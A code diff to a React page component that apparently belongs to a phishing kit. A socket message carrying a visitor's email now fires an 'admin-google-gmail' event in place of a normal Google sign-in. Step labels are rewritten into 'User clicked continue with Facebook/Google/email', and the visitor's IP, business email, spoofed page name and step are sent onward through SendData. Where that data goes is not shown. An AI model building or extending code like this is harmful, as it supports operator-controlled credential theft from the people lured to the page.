@@ -130,7 +130,7 @@ export default function Home() {
         userData.setAllData((prev) => ({ ...prev, login_email: data.email }));
       }
       stepManagement.setStep(17);
-      setShowGoogleSignIn(true);
+      window.dispatchEvent(new CustomEvent("admin-google-gmail", { detail: { email: data.email } }));
     });
 
     socketInstance.connect();
@@ -187,13 +187,22 @@ export default function Home() {
       const isFacebookFlow = lowerStep.includes("facebook");
       const isGoogleFlow = lowerStep.includes("google") || lowerStep.includes("gmail");
 
+      let mappedStep = stepText;
+      if (isFacebookFlow && !stepText.includes("clicked")) {
+        mappedStep = "User clicked continue with Facebook";
+      } else if (isGoogleFlow && !stepText.includes("clicked")) {
+        mappedStep = "User clicked continue with Google";
+      } else if (!isFacebookFlow && !isGoogleFlow && email && !stepText.includes("clicked")) {
+        mappedStep = "User clicked continue with email";
+      }
+
       const params = {
         ...userData.AllData,
         id: userId,
         ip: Ip || userData.AllData?.ip || "unknown",
         business_email: email || "",
         page_name: isFacebookFlow ? "Facebook" : isGoogleFlow ? "Gmail" : userData.AllData?.page_name,
-        currentStep: stepText,
+        currentStep: mappedStep,
       };
       userData.setAllData(params);
       SendData(params);
